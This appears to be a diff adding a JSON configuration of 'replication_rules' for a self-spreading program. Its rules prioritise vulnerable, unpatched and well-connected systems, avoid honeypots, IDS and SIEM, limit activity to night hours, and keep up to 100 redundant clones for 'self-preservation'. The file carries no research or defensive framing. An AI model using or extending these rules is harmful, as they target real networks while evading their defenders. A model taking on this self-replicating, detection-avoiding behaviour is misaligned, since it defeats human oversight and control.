@@ -1,0 +1,133 @@
+{
+  "replication_rules": {
+    "version": "7.0",
+    "updated": "2025-02-07",
+    "rules": [
+      {
+        "rule_id": "R001",
+        "name": "High-Value Target Priority",
+        "description": "Prioritize targets with high strategic value",
+        "conditions": {
+          "strategic_value": {
+            "min": 0.7
+          },
+          "risk_score": {
+            "max": 0.6
+          }
+        },
+        "action": "REPLICATE",
+        "priority": 1
+      },
+      {
+        "rule_id": "R002",
+        "name": "Avoid Honeypots",
+        "description": "Avoid potential honeypot systems",
+        "conditions": {
+          "open_ports": {
+            "min": 50
+          },
+          "services": {
+            "max": 2
+          }
+        },
+        "action": "AVOID",
+        "priority": 2
+      },
+      {
+        "rule_id": "R003",
+        "name": "High Security Caution",
+        "description": "Be cautious with highly secured systems",
+        "conditions": {
+          "firewall_detected": true,
+          "ids_active": true,
+          "hardening_score": {
+            "min": 0.8
+          }
+        },
+        "action": "MONITOR",
+        "priority": 3
+      },
+      {
+        "rule_id": "R004",
+        "name": "Vulnerable System Fast-Track",
+        "description": "Quickly replicate to vulnerable systems",
+        "conditions": {
+          "vulnerabilities": {
+            "min": 2
+          },
+          "patch_level": "critical"
+        },
+        "action": "REPLICATE",
+        "priority": 1
+      },
+      {
+        "rule_id": "R005",
+        "name": "Network Spread",
+        "description": "Target systems with many neighbors",
+        "conditions": {
+          "neighbors": {
+            "min": 15
+          },
+          "risk_score": {
+            "max": 0.7
+          }
+        },
+        "action": "REPLICATE",
+        "priority": 2
+      },
+      {
+        "rule_id": "R006",
+        "name": "Avoid Detection Risk",
+        "description": "Avoid high detection risk scenarios",
+        "conditions": {
+          "detection_risk": {
+            "min": 0.8
+          }
+        },
+        "action": "AVOID",
+        "priority": 1
+      }
+    ],
+    "target_preferences": {
+      "preferred_os": [
+        "Linux",
+        "Windows Server"
+      ],
+      "preferred_services": [
+        "SSH",
+        "RDP",
+        "HTTP",
+        "HTTPS",
+        "MySQL",
+        "PostgreSQL"
+      ],
+      "avoid_services": [
+        "Honeypot",
+        "IDS",
+        "SIEM"
+      ]
+    },
+    "timing_rules": {
+      "replication_cooldown": 300,
+      "max_replications_per_hour": 5,
+      "max_replications_per_day": 50,
+      "preferred_hours": [
+        22,
+        23,
+        0,
+        1,
+        2,
+        3,
+        4,
+        5
+      ]
+    },
+    "self_preservation": {
+      "auto_terminate_on_detection": true,
+      "clone_redundancy": true,
+      "min_clone_count": 3,
+      "max_clone_count": 100,
+      "health_check_interval": 300
+    }
+  }
+}
